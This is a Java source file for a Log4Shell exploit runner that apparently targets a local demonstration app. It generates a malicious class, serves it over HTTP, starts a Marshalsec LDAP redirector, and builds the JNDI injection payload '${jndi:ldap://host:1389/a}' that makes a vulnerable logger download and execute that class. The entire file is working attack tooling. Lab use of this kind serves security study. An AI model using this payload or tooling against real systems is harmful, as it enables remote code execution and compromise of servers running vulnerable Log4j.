package com.github.marceloleite2604;

import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

public class Exploiter {

  public static final String JAVA_8_HOME_PATH = "../jdk1.8.0_181";
  private static final String EXPLANATION = """
    Marshalsec service will respond to LDAP requests on port %d and redirect requests
    to download a Java class named %s located on %s (our HTTP server address).%n
    
    Now, would you be so kind to access this link:
    http://localhost:8080/log?input=%s
    """;

  private final ExploitClassGenerator exploitClassGenerator;

  private final MarshalsecStarter marshalsecStarter;

  private final HttpServerStarter httpServerStarter;

  public Exploiter() {
    exploitClassGenerator = new ExploitClassGenerator();
    marshalsecStarter = new MarshalsecStarter();
    httpServerStarter = new HttpServerStarter();
  }

  public void start(String host, int webPort, int ldapPort) throws IOException, InterruptedException {
    exploitClassGenerator.generate(host, ldapPort);
    httpServerStarter.createAndStart(webPort);

    final var marshalsecProcess = marshalsecStarter.start(host, webPort);

    final var logInput = buildLogInput(host);

    System.out.printf(
      EXPLANATION,
      MarshalsecStarter.MARSHALSEC_PORT,
      ExploitClassGenerator.CLASS_NAME,
      marshalsecStarter.getRedirectUrl(),
      logInput
      );

    marshalsecProcess.waitFor();
  }

  private String buildLogInput(String host) {
    var logInput = String.format("${jndi:ldap://%s:1389/a}", host);
    return URLEncoder.encode(logInput, StandardCharsets.UTF_8);
  }
}
